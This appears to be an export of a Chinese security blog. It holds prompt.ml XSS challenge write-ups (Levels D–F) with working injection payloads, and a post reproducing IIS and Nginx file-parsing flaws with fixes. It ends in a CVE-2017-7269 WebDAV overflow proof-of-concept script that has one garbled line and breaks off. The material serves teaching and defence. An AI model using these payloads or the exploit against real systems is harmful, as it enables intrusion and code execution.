&#123;\"source\":\"http://sandbox.prompt.ml/PROMPT.JPG\"&#125;</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> data = <span class=\"built_in\">JSON</span>.parse(input);</span><br><span class=\"line\">        <span class=\"keyword\">var</span> config = extend(&#123;</span><br><span class=\"line\">            <span class=\"comment\">// default image source</span></span><br><span class=\"line\">            source: <span class=\"string\">'http://placehold.it/350x150'</span></span><br><span class=\"line\">        &#125;, <span class=\"built_in\">JSON</span>.parse(input));</span><br><span class=\"line\">        <span class=\"comment\">// forbit invalid image source</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"regexp\">/[^\\w:\\/.]/</span>.test(config.source)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">delete</span> config.source;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// purify the source by stripping off \"</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> source = config.source.replace(<span class=\"regexp\">/\"/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\">        <span class=\"comment\">// insert the content using mustache-ish template</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'&lt;img src=\"&#123;&#123;source&#125;&#125;\"&gt;'</span>.replace(<span class=\"string\">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (e) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Invalid image data.'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span>(<span class=\"params\">input</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">// in Soviet Russia...</span></span><br><span class=\"line\">    input = <span class=\"built_in\">encodeURIComponent</span>(input).replace(<span class=\"regexp\">/'/g</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\">    <span class=\"comment\">// table flips you!</span></span><br><span class=\"line\">    input = input.replace(<span class=\"regexp\">/prompt/g</span>, <span class=\"string\">'alert'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// ノ┬─┬ノ ︵ ( \\o°o)\\</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;script&gt;'</span> + input + <span class=\"string\">'&lt;/script&gt; '</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-13\"><a href=\"#分析-13\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//input参数是这里进入的</span></span><br><span class=\"line\">try &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 举例输入的参数 &#123;\"source\":\"http://sandbox.prompt.ml/PROMPT.JPG\"&#125;</span></span><br><span class=\"line\">        <span class=\"comment\">//将input字符串转换成js数据</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> data = JSON.<span class=\"keyword\">parse</span>(<span class=\"keyword\">input</span>);</span><br><span class=\"line\">        获得定死的source</span><br><span class=\"line\">        <span class=\"keyword\">var</span> config = extend(&#123;</span><br><span class=\"line\">            <span class=\"comment\">// default image source</span></span><br><span class=\"line\">            source: 'http:<span class=\"comment\">//placehold.it/350x150'</span></span><br><span class=\"line\">        &#125;, JSON.<span class=\"keyword\">parse</span>(<span class=\"keyword\">input</span>));</span><br><span class=\"line\">        <span class=\"comment\">// 如果存在 字母数字下划线 / . 以外的就删除sourse </span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (/[^\\w:\\/.]/.<span class=\"keyword\">test</span>(config.source)) &#123;</span><br><span class=\"line\">            delete config.source;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        消除 \"</span><br><span class=\"line\">        <span class=\"keyword\">var</span> source = config.source.<span class=\"keyword\">replace</span>(/\"/<span class=\"keyword\">g</span>, '');</span><br><span class=\"line\">        <span class=\"comment\">// 插入sourse</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> '&lt;img src=<span class=\"string\">\"&#123;&#123;source&#125;&#125;\"</span>&gt;'.<span class=\"keyword\">replace</span>('&#123;&#123;source&#125;&#125;', source);</span><br><span class=\"line\">    &#125; catch (<span class=\"keyword\">e</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> 'Invalid image data.';</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这题的绕过需要<code>Object.prototype.__proto__</code>这个属性，这个属性已经不被建议用在实际代码中。</p>\n<p>看下面的例子是如何利用的。</p>\n<p><img src=\"/img/xss/prompt_ml/levelD_001.png\" alt=\"D_1\"></p>\n<p>当原来的值被删除时,可以用<code>__proto__</code>属性来赋值。可以构造形如</p>\n<p><code>{&quot;source&quot;:&quot;*&quot;,&quot;__proto__&quot;:{&quot;source&quot;:&quot;&quot;onerror=prompt(1)&gt;&quot;}}</code>来使原来的sources失效,而使用自己写入的来突破。</p>\n<p>但是第二次过滤的时候消除了<code>”</code>，想办法找个替代双引号的方法。</p>\n<p>这里的技巧为<code>String.prototype.replace()</code>支持特殊的<code>pattern</code>:</p>\n<p><img src=\"/img/xss/prompt_ml/levelD_002.png\" alt=\"D_2\"></p>\n<p>replace中使用$`会将变量的前部插入。</p>\n<p>在这里就是<code>&lt;img src=&quot;</code>，借用这个虽然playad结构改变,但是绕过了<code>&quot;</code></p>\n<h2 id=\"Solutions-13\"><a href=\"#Solutions-13\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>&#123;<span class=\"attr\">\"source\"</span>:<span class=\"string\">\"*\"</span>,<span class=\"attr\">\"__proto__\"</span>:&#123;<span class=\"attr\">\"source\"</span>:<span class=\"string\">\"$`onerror=prompt(1)&gt;\"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-13\"><a href=\"#Img-13\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><p>1.</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;<span class=\"attr\">\"source\"</span>:<span class=\"string\">\"*\"</span>,<span class=\"attr\">\"__proto__\"</span>:&#123;<span class=\"attr\">\"source\"</span>:<span class=\"string\">\"$`onerror=prompt(1)&gt;\"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/prompt_ml/levelD_003.png\" alt=\"D_3\"></p>\n<h1 id=\"Level-E\"><a href=\"#Level-E\" class=\"headerlink\" title=\"Level E\"></a>Level E</h1><h2 id=\"Code-14\"><a href=\"#Code-14\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight lua\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span></span> &#123;</span><br><span class=\"line\">    // I expect this one will have other solutions, so be creative :)</span><br><span class=\"line\">    // mspaint makes all file names <span class=\"keyword\">in</span> all-caps :(</span><br><span class=\"line\">    // too lazy to convert them back <span class=\"keyword\">in</span> <span class=\"built_in\">lower</span> case</span><br><span class=\"line\">    // sample <span class=\"built_in\">input</span>: prompt.jpg =&gt; PROMPT.JPG</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.toUpperCase();</span><br><span class=\"line\">    // only allows images <span class=\"built_in\">loaded</span> from own host <span class=\"keyword\">or</span> data URI scheme</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/\\/\\/|\\w+:/g, <span class=\"string\">'data:'</span>);</span><br><span class=\"line\">    // miscellaneous filtering</span><br><span class=\"line\">    <span class=\"built_in\">input</span> = <span class=\"built_in\">input</span>.replace(/[\\\\&amp;+%\\s]|vbs/gi, <span class=\"string\">'_'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">'&lt;img src=\"'</span> + <span class=\"built_in\">input</span> + <span class=\"string\">'\"&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-14\"><a href=\"#分析-14\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">第一层：转成大写</span><br><span class=\"line\">第二层：把// xxx:转成<span class=\"class\"><span class=\"keyword\">data</span>(<span class=\"title\">xxx</span>表示任意字母)</span></span><br><span class=\"line\">第三层：过滤了\\ &amp; + % 空白符 和vbs</span><br><span class=\"line\">由于转换了大写,html的标签无法使用了,这时候考虑引用外部的js文件。</span><br><span class=\"line\">由于引用外部的js文件势必要使用到http:或http:这样的协议,所有这条路被封死了。</span><br><span class=\"line\">考虑一下<span class=\"class\"><span class=\"keyword\">data</span>:是否能利用。</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/xss/prompt_ml/levelE_001.png\" alt=\"E_1\"></p>\n<p>因为经过大写转换,就只能利用base64编码的写法了。</p>\n<p><code>&lt;IFRAME/SRC=&quot;data:TEXT/HTML;BASE64,PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=&quot;&gt;</code></p>\n<p><code>PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=</code>是<code>&lt;script&gt;prompt(1)&lt;/script&gt;</code>经过base64编码再改大写的。</p>\n<h2 id=\"Solutions-14\"><a href=\"#Solutions-14\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span> <span class=\"string\">\"&gt;&lt;iframe/src=\"</span>data:text/html;base<span class=\"number\">64</span>,PH<span class=\"symbol\">NjcmlwdD5</span>wc<span class=\"name\">m9</span>tcHQoMSk<span class=\"number\">8</span>L<span class=\"number\">3</span><span class=\"symbol\">NjcmlwdD4</span>=</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Img-14\"><a href=\"#Img-14\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><p>这题在环境下没有成功,但是在本地测试下是可行的。</p>\n<p><img src=\"/img/xss/prompt_ml/levelE_002.png\" alt=\"E_2\"></p>\n<h1 id=\"Level-F\"><a href=\"#Level-F\" class=\"headerlink\" title=\"Level F\"></a>Level F</h1><h2 id=\"Code-15\"><a href=\"#Code-15\" class=\"headerlink\" title=\"Code:\"></a>Code:</h2><figure class=\"highlight scilab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">escape</span><span class=\"params\">(input)</span> &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">// sort of spoiler of level 7</span></span><br><span class=\"line\">    input = input.replace(/\\*/g, <span class=\"string\">''</span>);</span><br><span class=\"line\">    <span class=\"comment\">// pass in something like dog#cat#bird#mouse...</span></span><br><span class=\"line\">    var segments = input.split(<span class=\"string\">'#'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> segments.map(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">(title, index)</span> &#123;</span></span><br><span class=\"line\">        <span class=\"comment\">// title can only contain 15 characters</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'&lt;p class=\"</span>comment<span class=\"string\">\" title=\"</span><span class=\"string\">' + title.slice(0, 15) + '</span><span class=\"string\">\" data-comment=\\'&#123;\"</span>id<span class=\"string\">\":'</span> + index + <span class=\"string\">'&#125;\\'&gt;&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;).join(<span class=\"string\">'\\n'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"分析-15\"><a href=\"#分析-15\" class=\"headerlink\" title=\"分析:\"></a>分析:</h2><p>这一课和Level7的很类似。解决的思路是一样的,这里最大长度为15个字符,可以使用&lt;!–多行注释。</p>\n<h2 id=\"Solutions-15\"><a href=\"#Solutions-15\" class=\"headerlink\" title=\"Solutions:\"></a>Solutions:</h2><ol>\n<li><p><code>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;</code><br>经过测试firfox下面也可以<br><code>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/</code></p>\n</li>\n<li></li>\n</ol>\n<p><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></p>\n<ol start=\"3\">\n<li>利用eval函数特性执行拼接内容</li>\n</ol>\n<p><code>&quot;&gt;&lt;script&gt;/*#*/a=&#39;prom&#39;/*#*/+&#39;pt(1)&#39;/*#*/eval(a)/*#*/&lt;/script&gt;</code></p>\n<h2 id=\"Img-15\"><a href=\"#Img-15\" class=\"headerlink\" title=\"Img:\"></a>Img:</h2><ol>\n<li><code>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/levelF_001.png\" alt=\"F_1\"></p>\n<ol start=\"2\">\n<li><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></li>\n</ol>\n<p><img src=\"/img/xss/prompt_ml/levelF_002.png\" alt=\"F_2\"></p>\n"},{"title":"中间件及其相关漏洞复现","date":"2018-11-23T06:17:11.000Z","_content":"\n# 中间件及其相关漏洞复现\n\n# IIS相关\n\n## IIS 5.x-6.x 解析漏洞\n\n一个细的知识点:IIS6.0 默认的可执行文件除了asp还包含这三种(aspx也能)\n\n```\n/yyg.asa\n/yyg.cer\n/yyg.cdx #本地测试失败,变成下载\n/yyg.aspx\n```\n\n### 漏洞原理\n\n未修改配置的情况下,IIS`asa`,`asp`,`cdx`,`cer`这几个缀名映射的了负责解析的asp.dll。\n\n![001_0](/img/knowledge/Middleware_Parsing_vulnerability/001_0.png)\n\niis 6.0解析漏洞有两种利用方式\n\n### 目录解析\n\n```\n/yyg.asp/yyg.png\n```\n目录解析方式利用如上,在网站上建立了`.asp`或`.asa`等可利用的文件夹,在该文件夹下的任何扩张名的文件都会被IIS解析成asp文件来执行。\n\n一般的利用方式:\n\n创建目录`yyg.asp`,那么通过某种手段上传文件到该目录\n\n```\n/yyg.asp/yyg.png\n```\n\n无视后缀名即可拿shell\n\n![001_1](/img/knowledge/Middleware_Parsing_vulnerability/001_1.png)\n\n### 文件解析\n\n```\n/yyg.asp;.png\n```\n\n![001_2](/img/knowledge/Middleware_Parsing_vulnerability/001_2.png)\n\n`/yyg.asp;.png`分号后面的`.png`不会被解析\n\n### 修复方式\n\n由于微软认为这是IIS的特性,一直没有安全补丁,可以选择高版本的IIS.\n\n1. 通过正则编写,阻止非法文件名上传\n2. 进行权限设置,限制用户创建文件夹\n\n## IIS 7.0/IIS 7.5/Nginx <8.03畸形解析漏洞解析漏洞\n\n### 漏洞原理\n\n漏洞需要Fast-CGI调用php,并且在php.ini中需要cgi.fix_pathinfo=1。在这个选项被打开的情况下,php-fpm会`SCRIPT_FILENAME`是否存在，如果不存在则去掉最后一个`/`及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。所以，第一次fpm发现`yyg.png/.php`不存在，则去掉`/.php`，再判断`yyg.png`是否存在。当这个文件是存在的，会被作为PHP文件执行，导致解析漏洞。\n\n### IIS 7.5\n\n测试环境:win7(x86)+IIS 7.0+php5.3.29  (php5.2.17,php5.4.45-nts,php5.6.27-nts,php7.0.12-nts,php7.1.13-nts,7.2.10-nts)\n\nwin2008R2(x64)+IIS 7.0+php5.3.29  (php5.2.17,php5.4.45-nts,php5.6.27-nts,php7.0.12-nts,php7.1.13-nts,7.2.10-nts)\n\n需要php.ini中cgi.fix_pathinfo=1,通常情况下是默认开启。\n\n![002_1](/img/knowledge/Middleware_Parsing_vulnerability/002_1.png)\n\n\n\n![002_2](/img/knowledge/Middleware_Parsing_vulnerability/002_2.png)\n\n![002_3](/img/knowledge/Middleware_Parsing_vulnerability/002_3.png)\n\n### IIS 7.0\n\n![002_4](/img/knowledge/Middleware_Parsing_vulnerability/002_4.png)\n\n\n\n### IIS 7.0/7.5 修复方式\n\n1.如果需要继续FastCGI方式调用PHP,可以在php.ini中设置cgi.fix_pathinfo=0,修改保存后要重启IIS,可能影响到某些服务,谨慎使用。\n\n2.增强IIS设置\n\n在IIS里找到“处理程序映射”，然后对PHP这一项进行编辑，点击“请求限制”，把“仅当请求映射至以下内容时才调用处理程序”这个选项勾上即可；\n\n![002_5](/img/knowledge/Middleware_Parsing_vulnerability/002_5.png)\n\n查看解析结果\n\n![002_6](/img/knowledge/Middleware_Parsing_vulnerability/002_6.png)\n\n### Nginx\n\n### 漏洞原理\n\n测试环境采用的是`vulhub`的`nginx/nginx_parsing_vulnerability`,说是Nginx的锅,实际还是和上面的一样,还是`cgi.fix_pathinfo=1`,当访问`ngnix.png/.php`时,`ngnix.png/.php`存在而进行修剪,最终将`ngnix.png`当php解析。\n\n![002_7](/img/knowledge/Middleware_Parsing_vulnerability/002_7.png)\n\n#### Nginx修复方式\n\n1. 修改php.ini文件，将cgi.fix_pathinfo的值设置为0\n\n2. 正则表达式过滤非法输入,代码如下\n\n   ```\n   #配置nginx.conf\n   if ( $fastcgi_script_name ~ \\..*\\/.*php ) {\n   　　return 403;\n   }\n   ```\n\n3. 在Nginx端使用`fastcgi_split_path_info`将path info信息去除后，用tryfiles判断文件是否存在；并借助PHP-FPM的`security.limit_extensions`配置项，避免其他后缀文件被解析。\n\n## IIS6.0远程命令执行漏洞(CVE-2017-7269)\n\n### 漏洞原理\n\n开启WebDAV服务的IIS 6.0存在缓存区溢出漏洞导致远程代码执行\n\n### 环境\n\nwindows server2003\n\n### 探测脚本\n\n`https://github.com/lcatro/CVE-2017-7269-Echo-PoC`\n\n```\n#https://github.com/lcatro/CVE-2017-7269-Echo-PoC\nimport socket\nimport sys\nimport time\n\ndef generate_payload(port):\n    pay='PROPFIND / HTTP/1.1\\r\\nHost: localhost:'+ port  +'\\r\\nContent-Length: 0\\r\\n'\n    pay+='If: <http://localhost:' + port + '/aaaaaaa'\n    pay+='\\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x89\\xb2\\xe5\\xa8\\xb0\\xe5\\xa4\\xb8\\xe5\\x91\\x88\\xc8\\x82\\xc8\\x82\\xe1\\x8b\\x80\\xe6\\xa0\\x83\\xe6\\xb1\\x84\\xe5\\x89\\x96\\xe4\\xac\\xb7\\xe6\\xb1\\xad\\xe4\\xbd\\x98\\xe5\\xa1\\x9a\\xe7\\xa5\\x90\\xe4\\xa5\\xaa\\xe5\\xa1\\x8f\\xe4\\xa9\\x92\\xe4\\x85\\x90\\xe6\\x99\\x8d\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\xa0\\xb4\\xe6\\x94\\xb1\\xe6\\xbd\\x83\\xe6\\xb9\\xa6\\xe7\\x91\\x81\\xe4\\x8d\\xac\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe5\\x8d\\x83\\xe6\\xa9\\x81\\xe7\\x81\\x92\\xe3\\x8c\\xb0\\xe5\\xa1\\xa6\\xe4\\x89\\x8c\\xe7\\x81\\x8b\\xe6\\x8d\\x86\\xe5\\x85\\xb3\\xe7\\xa5\\x81\\xe7\\xa9\\x90\\xe4\\xa9\\xac'\n    pay+='>'\n    pay+=' (Not <locktoken:write1>) <http://localhost:' + port + '/bbbbbbb'\n    pay+='\\xe7\\xa5\\x88\\xe6\\x85\\xb5\\xe4\\xbd\\x83\\xe6\\xbd\\xa7\\xe6\\xad\\xaf\\xe4\\xa1\\x85\\xe3\\x99\\x86\\xe6\\x9d\\xb5\\xe4\\x90\\xb3\\xe3\\xa1\\xb1\\xe5\\x9d\\xa5\\xe5\\xa9\\xa2\\xe5\\x90\\xb5\\xe5\\x99\\xa1\\xe6\\xa5\\x92\\xe6\\xa9\\x93\\xe5\\x85\\x97\\xe3\\xa1\\x8e\\xe5\\xa5\\x88\\xe6\\x8d\\x95\\xe4\\xa5\\xb1\\xe4\\x8d\\xa4\\xe6\\x91\\xb2\\xe3\\x91\\xa8\\xe4\\x9d\\x98\\xe7\\x85\\xb9\\xe3\\x8d\\xab\\xe6\\xad\\x95\\xe6\\xb5\\x88\\xe5\\x81\\x8f\\xe7\\xa9\\x86\\xe3\\x91\\xb1\\xe6\\xbd\\x94\\xe7\\x91\\x83\\xe5\\xa5\\x96\\xe6\\xbd\\xaf\\xe7\\x8d\\x81\\xe3\\x91\\x97\\xe6\\x85\\xa8\\xe7\\xa9\\xb2\\xe3\\x9d\\x85\\xe4\\xb5\\x89\\xe5\\x9d\\x8e\\xe5\\x91\\x88\\xe4\\xb0\\xb8\\xe3\\x99\\xba\\xe3\\x95\\xb2\\xe6\\x89\\xa6\\xe6\\xb9\\x83\\xe4\\xa1\\xad\\xe3\\x95\\x88\\xe6\\x85\\xb7\\xe4\\xb5\\x9a\\xe6\\x85\\xb4\\xe4\\x84\\xb3\\xe4\\x8d\\xa5\\xe5\\x89\\xb2\\xe6\\xb5\\xa9\\xe3\\x99\\xb1\\xe4\\xb9\\xa4\\xe6\\xb8\\xb9\\xe6\\x8d\\x93\\xe6\\xad\\xa4\\xe5\\x85\\x86\\xe4\\xbc\\xb0\\xe7\\xa1\\xaf\\xe7\\x89\\x93\\xe6\\x9d\\x90\\xe4\\x95\\x93\\xe7\\xa9\\xa3\\xe7\\x84\\xb9\\xe4\\xbd\\x93\\xe4\\x91\\x96\\xe6\\xbc\\xb6\\xe7\\x8d\\xb9\\xe6\\xa1\\xb7\\xe7\\xa9\\x96\\xe6\\x85\\x8a\\xe3\\xa5\\x85\\xe3\\x98\\xb9\\xe6\\xb0\\xb9\\xe4\\x94\\xb1\\xe3\\x91\\xb2\\xe5\\x8d\\xa5\\xe5\\xa1\\x8a\\xe4\\x91\\x8e\\xe7\\xa9\\x84\\xe6\\xb0\\xb5\\xe5\\xa9\\x96\\xe6\\x89\\x81\\xe6\\xb9\\xb2\\xe6\\x98\\xb1\\xe5\\xa5\\x99\\xe5\\x90\\xb3\\xe3\\x85\\x82\\xe5\\xa1\\xa5\\xe5\\xa5\\x81\\xe7\\x85\\x90\\xe3\\x80\\xb6\\xe5\\x9d\\xb7\\xe4\\x91\\x97\\xe5\\x8d\\xa1\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe6\\xb9\\x8f\\xe6\\xa0\\x80\\xe4\\x89\\x87\\xe7\\x99\\xaa\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xe4\\x89\\x97\\xe4\\xbd\\xb4\\xe5\\xa5\\x87\\xe5\\x88\\xb4\\xe4\\xad\\xa6\\xe4\\xad\\x82\\xe7\\x91\\xa4\\xe7\\xa1\\xaf\\xe6\\x82\\x82\\xe6\\xa0\\x81\\xe5\\x84\\xb5\\xe7\\x89\\xba\\xe7\\x91\\xba\\xe4\\xb5\\x87\\xe4\\x91\\x99\\xe5\\x9d\\x97\\xeb\\x84\\x93\\xe6\\xa0\\x80\\xe3\\x85\\xb6\\xe6\\xb9\\xaf\\xe2\\x93\\xa3\\xe6\\xa0\\x81\\xe1\\x91\\xa0\\xe6\\xa0\\x83\\xcc\\x80\\xe7\\xbf\\xbe\\xef\\xbf\\xbf\\xef\\xbf\\xbf\\xe1\\x8f\\x80\\xe6\\xa0\\x83\\xd1\\xae\\xe6\\xa0\\x83\\xe7\\x85\\xae\\xe7\\x91\\xb0\\xe1\\x90\\xb4\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81\\xe9\\x8e\\x91\\xe6\\xa0\\x80\\xe3\\xa4\\xb1\\xe6\\x99\\xae\\xe4\\xa5\\x95\\xe3\\x81\\x92\\xe5\\x91\\xab\\xe7\\x99\\xab\\xe7\\x89\\x8a\\xe7\\xa5\\xa1\\xe1\\x90\\x9c\\xe6\\xa0\\x83\\xe6\\xb8\\x85\\xe6\\xa0\\x80\\xe7\\x9c\\xb2\\xe7\\xa5\\xa8\\xe4\\xb5\\xa9\\xe3\\x99\\xac\\xe4\\x91\\xa8\\xe4\\xb5\\xb0\\xe8\\x89\\x86\\xe6\\xa0\\x80\\xe4\\xa1\\xb7\\xe3\\x89\\x93\\xe1\\xb6\\xaa\\xe6\\xa0\\x82\\xe6\\xbd\\xaa\\xe4\\x8c\\xb5\\xe1\\x8f\\xb8\\xe6\\xa0\\x83\\xe2\\xa7\\xa7\\xe6\\xa0\\x81'\n    shellcoden    pay+=shellcode\n    pay+='>\\r\\n\\r\\n'\n    return pay\n\ndef send_pack(ip,port=80) :\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.connect((ip,port))\n    time_tick=time.time()\n    sock.send(generate_payload(str(port)))\n    \n    try :\n        